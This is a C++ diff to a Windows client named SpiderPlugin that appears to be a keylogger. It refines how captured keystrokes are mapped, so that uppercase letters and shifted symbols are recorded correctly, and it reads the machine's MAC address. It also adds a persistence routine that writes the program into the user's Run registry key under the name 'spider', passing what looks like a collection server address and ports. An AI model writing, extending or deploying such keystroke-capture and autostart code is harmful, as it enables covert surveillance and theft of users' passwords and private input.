@@ -10,8 +10,6 @@
 #include "SpiderPlugin.h"
 #include "MacAddr.h"
 
-#include <iostream> // TODO: rm
-
 namespace spider
 {
   namespace client
@@ -45,32 +43,58 @@ namespace spider
               {0x37, KeyboardKey::KB_7},
               {0x38, KeyboardKey::KB_8},
               {0x39, KeyboardKey::KB_9},
-              {0x41, KeyboardKey::KB_A},
-              {0x42, KeyboardKey::KB_B},
-              {0x43, KeyboardKey::KB_C},
-              {0x44, KeyboardKey::KB_D},
-              {0x45, KeyboardKey::KB_E},
-              {0x46, KeyboardKey::KB_F},
-              {0x47, KeyboardKey::KB_G},
-              {0x48, KeyboardKey::KB_H},
-              {0x49, KeyboardKey::KB_I},
-              {0x4A, KeyboardKey::KB_J},
-              {0x4B, KeyboardKey::KB_K},
-              {0x4C, KeyboardKey::KB_L},
-              {0x4D, KeyboardKey::KB_M},
-              {0x4E, KeyboardKey::KB_N},
-              {0x4F, KeyboardKey::KB_O},
-              {0x50, KeyboardKey::KB_P},
-              {0x51, KeyboardKey::KB_Q},
-              {0x52, KeyboardKey::KB_R},
-              {0x53, KeyboardKey::KB_S},
-              {0x54, KeyboardKey::KB_T},
-              {0x55, KeyboardKey::KB_U},
-              {0x56, KeyboardKey::KB_V},
-              {0x57, KeyboardKey::KB_W},
-              {0x58, KeyboardKey::KB_X},
-              {0x59, KeyboardKey::KB_Y},
-              {0x5A, KeyboardKey::KB_Z},
+              {0x41, KeyboardKey::KB_A_MINUS},
+              {0x42, KeyboardKey::KB_B_MINUS},
+              {0x43, KeyboardKey::KB_C_MINUS},
+              {0x44, KeyboardKey::KB_D_MINUS},
+              {0x45, KeyboardKey::KB_E_MINUS},
+              {0x46, KeyboardKey::KB_F_MINUS},
+              {0x47, KeyboardKey::KB_G_MINUS},
+              {0x48, KeyboardKey::KB_H_MINUS},
+              {0x49, KeyboardKey::KB_I_MINUS},
+              {0x4A, KeyboardKey::KB_J_MINUS},
+              {0x4B, KeyboardKey::KB_K_MINUS},
+              {0x4C, KeyboardKey::KB_L_MINUS},
+              {0x4D, KeyboardKey::KB_M_MINUS},
+              {0x4E, KeyboardKey::KB_N_MINUS},
+              {0x4F, KeyboardKey::KB_O_MINUS},
+              {0x50, KeyboardKey::KB_P_MINUS},
+              {0x51, KeyboardKey::KB_Q_MINUS},
+              {0x52, KeyboardKey::KB_R_MINUS},
+              {0x53, KeyboardKey::KB_S_MINUS},
+              {0x54, KeyboardKey::KB_T_MINUS},
+              {0x55, KeyboardKey::KB_U_MINUS},
+              {0x56, KeyboardKey::KB_V_MINUS},
+              {0x57, KeyboardKey::KB_W_MINUS},
+              {0x58, KeyboardKey::KB_X_MINUS},
+              {0x59, KeyboardKey::KB_Y_MINUS},
+              {0x5A, KeyboardKey::KB_Z_MINUS},
+              {0x41 | 0xFF00, KeyboardKey::KB_A},
+              {0x42 | 0xFF00, KeyboardKey::KB_B},
+              {0x43 | 0xFF00, KeyboardKey::KB_C},
+              {0x44 | 0xFF00, KeyboardKey::KB_D},
+              {0x45 | 0xFF00, KeyboardKey::KB_E},
+              {0x46 | 0xFF00, KeyboardKey::KB_F},
+              {0x47 | 0xFF00, KeyboardKey::KB_G},
+              {0x48 | 0xFF00, KeyboardKey::KB_H},
+              {0x49 | 0xFF00, KeyboardKey::KB_I},
+              {0x4A | 0xFF00, KeyboardKey::KB_J},
+              {0x4B | 0xFF00, KeyboardKey::KB_K},
+              {0x4C | 0xFF00, KeyboardKey::KB_L},
+              {0x4D | 0xFF00, KeyboardKey::KB_M},
+              {0x4E | 0xFF00, KeyboardKey::KB_N},
+              {0x4F | 0xFF00, KeyboardKey::KB_O},
+              {0x50 | 0xFF00, KeyboardKey::KB_P},
+              {0x51 | 0xFF00, KeyboardKey::KB_Q},
+              {0x52 | 0xFF00, KeyboardKey::KB_R},
+              {0x53 | 0xFF00, KeyboardKey::KB_S},
+              {0x54 | 0xFF00, KeyboardKey::KB_T},
+              {0x55 | 0xFF00, KeyboardKey::KB_U},
+              {0x56 | 0xFF00, KeyboardKey::KB_V},
+              {0x57 | 0xFF00, KeyboardKey::KB_W},
+              {0x58 | 0xFF00, KeyboardKey::KB_X},
+              {0x59 | 0xFF00, KeyboardKey::KB_Y},
+              {0x5A | 0xFF00, KeyboardKey::KB_Z},
               {VK_LWIN, KeyboardKey::KB_LCMD},
               {VK_RWIN, KeyboardKey::KB_RCMD},
               {VK_NUMPAD0, KeyboardKey::KB_0},
@@ -181,6 +205,9 @@ namespace spider
 	getInfosWindows();
 
 	MacAddress::get(m_macAddr);
+
+	// Register program for automatic startup
+	registerProgram();
 
 	return true;
       }
@@ -316,96 +343,109 @@ namespace spider
 	        static_cast<std::uint32_t>(m_windowsKeyboardMap[virtualKey]);
 	    if (shift)
 	      {
-		switch (msg.sys.event.key)
+		if (virtualKey >= 0x41 && virtualKey <= 0x5A)
 		  {
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_1):
 		    msg.sys.event.key = static_cast<std::uint32_t>(
-		        KeyboardKey::KB_EXCLAMATION);
-		    break;
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_2):
-		    msg.sys.event.key =
-		        static_cast<std::uint32_t>(KeyboardKey::KB_ATSYMBOL);
-		    break;
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_3):
-		    msg.sys.event.key =
-		        static_cast<std::uint32_t>(KeyboardKey::KB_HASHTAG);
-		    break;
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_4):
-		    msg.sys.event.key =
-		        static_cast<std::uint32_t>(KeyboardKey::KB_DOLLAR);
-		    break;
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_5):
-		    msg.sys.event.key =
-		        static_cast<std::uint32_t>(KeyboardKey::KB_PERCENT);
-		    break;
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_6):
-		    msg.sys.event.key =
-		        static_cast<std::uint32_t>(KeyboardKey::KB_CIRCUMFLEX);
-		    break;
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_7):
-		    msg.sys.event.key =
-		        static_cast<std::uint32_t>(KeyboardKey::KB_AMPERSAND);
-		    break;
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_8):
-		    msg.sys.event.key =
-		        static_cast<std::uint32_t>(KeyboardKey::KB_ASTERISK);
-		    break;
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_9):
-		    msg.sys.event.key =
-		        static_cast<std::uint32_t>(KeyboardKey::KB_LEFTPAREN);
-		    break;
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_0):
-		    msg.sys.event.key = static_cast<std::uint32_t>(
-		        KeyboardKey::KB_EXCLAMATION);
-		    break;
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_SEMICOLON):
-		    msg.sys.event.key =
-		        static_cast<std::uint32_t>(KeyboardKey::KB_COLON);
-		    break;
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_EQUALS):
-		    msg.sys.event.key =
-		        static_cast<std::uint32_t>(KeyboardKey::KB_PLUS);
-		    break;
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_COMMA):
-		    msg.sys.event.key =
-		        static_cast<std::uint32_t>(KeyboardKey::KB_INFERIOR);
-		    break;
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_MINUS):
-		    msg.sys.event.key =
-		        static_cast<std::uint32_t>(KeyboardKey::KB_UNDERSCORE);
-		    break;
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_DOT):
-		    msg.sys.event.key =
-		        static_cast<std::uint32_t>(KeyboardKey::KB_SUPERIOR);
-		    break;
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_SLASH):
-		    msg.sys.event.key =
-		        static_cast<std::uint32_t>(KeyboardKey::KB_QUESTION);
-		    break;
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_BACKQUOTE):
-		    msg.sys.event.key =
-		        static_cast<std::uint32_t>(KeyboardKey::KB_TILDE);
-		    break;
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_LEFTBRACKET):
-		    msg.sys.event.key =
-		        static_cast<std::uint32_t>(KeyboardKey::KB_LEFTBRACE);
-		    break;
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_BACKSLASH):
-		    msg.sys.event.key = static_cast<std::uint32_t>(
-		        KeyboardKey::KB_VERTICALBAR);
-		    break;
-		  case static_cast<std::uint32_t>(
-		      KeyboardKey::KB_RIGHTBRACKET):
-		    msg.sys.event.key =
-		        static_cast<std::uint32_t>(KeyboardKey::KB_RIGHTBRACE);
-		    break;
-		  case static_cast<std::uint32_t>(KeyboardKey::KB_SIMPLEQUOTE):
-		    msg.sys.event.key = static_cast<std::uint32_t>(
-		        KeyboardKey::KB_DOUBLEQUOTE);
-		    break;
-		  default:
-		    msg.sys.event.upper = 1;
-		    break;
+		        m_windowsKeyboardMap[virtualKey | 0xFF00]);
+		  }
+		else
+		  {
+		    switch (msg.sys.event.key)
+		      {
+		      case static_cast<std::uint32_t>(KeyboardKey::KB_1):
+			msg.sys.event.key = static_cast<std::uint32_t>(
+			    KeyboardKey::KB_EXCLAMATION);
+			break;
+		      case static_cast<std::uint32_t>(KeyboardKey::KB_2):
+			msg.sys.event.key = static_cast<std::uint32_t>(
+			    KeyboardKey::KB_ATSYMBOL);
+			break;
+		      case static_cast<std::uint32_t>(KeyboardKey::KB_3):
+			msg.sys.event.key = static_cast<std::uint32_t>(
+			    KeyboardKey::KB_HASHTAG);
+			break;
+		      case static_cast<std::uint32_t>(KeyboardKey::KB_4):
+			msg.sys.event.key =
+			    static_cast<std::uint32_t>(KeyboardKey::KB_DOLLAR);
+			break;
+		      case static_cast<std::uint32_t>(KeyboardKey::KB_5):
+			msg.sys.event.key = static_cast<std::uint32_t>(
+			    KeyboardKey::KB_PERCENT);
+			break;
+		      case static_cast<std::uint32_t>(KeyboardKey::KB_6):
+			msg.sys.event.key = static_cast<std::uint32_t>(
+			    KeyboardKey::KB_CIRCUMFLEX);
+			break;
+		      case static_cast<std::uint32_t>(KeyboardKey::KB_7):
+			msg.sys.event.key = static_cast<std::uint32_t>(
+			    KeyboardKey::KB_AMPERSAND);
+			break;
+		      case static_cast<std::uint32_t>(KeyboardKey::KB_8):
+			msg.sys.event.key = static_cast<std::uint32_t>(
+			    KeyboardKey::KB_ASTERISK);
+			break;
+		      case static_cast<std::uint32_t>(KeyboardKey::KB_9):
+			msg.sys.event.key = static_cast<std::uint32_t>(
+			    KeyboardKey::KB_LEFTPAREN);
+			break;
+		      case static_cast<std::uint32_t>(KeyboardKey::KB_0):
+			msg.sys.event.key = static_cast<std::uint32_t>(
+			    KeyboardKey::KB_EXCLAMATION);
+			break;
+		      case static_cast<std::uint32_t>(
+		          KeyboardKey::KB_SEMICOLON):
+			msg.sys.event.key =
+			    static_cast<std::uint32_t>(KeyboardKey::KB_COLON);
+			break;
+		      case static_cast<std::uint32_t>(KeyboardKey::KB_EQUALS):
+			msg.sys.event.key =
+			    static_cast<std::uint32_t>(KeyboardKey::KB_PLUS);
+			break;
+		      case static_cast<std::uint32_t>(KeyboardKey::KB_COMMA):
+			msg.sys.event.key = static_cast<std::uint32_t>(
+			    KeyboardKey::KB_INFERIOR);
+			break;
+		      case static_cast<std::uint32_t>(KeyboardKey::KB_MINUS):
+			msg.sys.event.key = static_cast<std::uint32_t>(
+			    KeyboardKey::KB_UNDERSCORE);
+			break;
+		      case static_cast<std::uint32_t>(KeyboardKey::KB_DOT):
+			msg.sys.event.key = static_cast<std::uint32_t>(
+			    KeyboardKey::KB_SUPERIOR);
+			break;
+		      case static_cast<std::uint32_t>(KeyboardKey::KB_SLASH):
+			msg.sys.event.key = static_cast<std::uint32_t>(
+			    KeyboardKey::KB_QUESTION);
+			break;
+		      case static_cast<std::uint32_t>(
+		          KeyboardKey::KB_BACKQUOTE):
+			msg.sys.event.key =
+			    static_cast<std::uint32_t>(KeyboardKey::KB_TILDE);
+			break;
+		      case static_cast<std::uint32_t>(
+		          KeyboardKey::KB_LEFTBRACKET):
+			msg.sys.event.key = static_cast<std::uint32_t>(
+			    KeyboardKey::KB_LEFTBRACE);
+			break;
+		      case static_cast<std::uint32_t>(
+		          KeyboardKey::KB_BACKSLASH):
+			msg.sys.event.key = static_cast<std::uint32_t>(
+			    KeyboardKey::KB_VERTICALBAR);
+			break;
+		      case static_cast<std::uint32_t>(
+		          KeyboardKey::KB_RIGHTBRACKET):
+			msg.sys.event.key = static_cast<std::uint32_t>(
+			    KeyboardKey::KB_RIGHTBRACE);
+			break;
+		      case static_cast<std::uint32_t>(
+		          KeyboardKey::KB_SIMPLEQUOTE):
+			msg.sys.event.key = static_cast<std::uint32_t>(
+			    KeyboardKey::KB_DOUBLEQUOTE);
+			break;
+		      default:
+			msg.sys.event.upper = 1;
+			break;
+		      }
 		  }
 	      }
 	  }
@@ -583,6 +623,102 @@ namespace spider
 	      }
 	    TranslateMessage(&msg);
 	    DispatchMessage(&msg);
+	  }
+      }
+
+      bool SpiderPlugin::isRegistered(PCWSTR pszAppName) const
+      {
+	HKEY  hKey = nullptr;
+	LONG  lResult = 0;
+	bool  fSuccess = true;
+	DWORD dwRegType = REG_SZ;
+	WCHAR szPathToExe[MAX_PATH] = {};
+	DWORD dwSize = sizeof(szPathToExe);
+
+	lResult =
+	    RegOpenKeyExW(HKEY_CURRENT_USER,
+	                  L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+	                  0, KEY_READ, &hKey);
+
+	fSuccess = (lResult == 0);
+
+	if (fSuccess)
+	  {
+	    lResult = RegGetValueW(hKey, nullptr, pszAppName, RRF_RT_REG_SZ,
+	                           &dwRegType, szPathToExe, &dwSize);
+	    fSuccess = (lResult == 0);
+	  }
+
+	if (fSuccess)
+	  {
+	    fSuccess = (wcslen(szPathToExe) > 0) ? true : false;
+	  }
+
+	if (hKey != nullptr)
+	  {
+	    RegCloseKey(hKey);
+	    hKey = nullptr;
+	  }
+
+	return fSuccess;
+      }
+
+      bool SpiderPlugin::registerForStartup(PCWSTR pszAppName,
+                                            PCWSTR pathToExe, PCWSTR args)
+      {
+	HKEY  hKey = nullptr;
+	LONG  lResult = 0;
+	bool  fSuccess = true;
+	DWORD dwSize;
+
+	const size_t count = MAX_PATH * 2;
+	WCHAR        szValue[count] = {};
+
+	wcscpy_s(szValue, count, L"\"");
+	wcscat_s(szValue, count, pathToExe);
+	wcscat_s(szValue, count, L"\" ");
+
+	if (args)
+	  {
+	    // caller should make sure "args" is quoted if any single argument
+	    // has a space
+	    // e.g. (L"-name \"Mark Voidale\"");
+	    wcscat_s(szValue, count, args);
+	  }
+
+	lResult = RegCreateKeyExW(
+	    HKEY_CURRENT_USER,
+	    L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, nullptr,
+	    0, (KEY_WRITE | KEY_READ), nullptr, &hKey, nullptr);
+
+	fSuccess = (lResult == 0);
+
+	if (fSuccess)
+	  {
+	    dwSize = (wcslen(szValue) + 1) * 2;
+	    lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ,
+	                             (BYTE *)szValue, dwSize);
+	    fSuccess = (lResult == 0);
+	  }
+
+	if (hKey)
+	  {
+	    RegCloseKey(hKey);
+	    hKey = nullptr;
+	  }
+
+	return fSuccess;
+      }
+
+      void SpiderPlugin::registerProgram()
+      {
+	std::array<WCHAR, MAX_PATH> pathToExe;
+
+	if (!isRegistered(L"spider"))
+	  {
+	    GetModuleFileNameW(nullptr, pathToExe.data(), sizeof(pathToExe));
+	    registerForStartup(L"spider", pathToExe.data(),
+	                       L"172.16.107.1 1337 1338");
 	  }
       }
     }
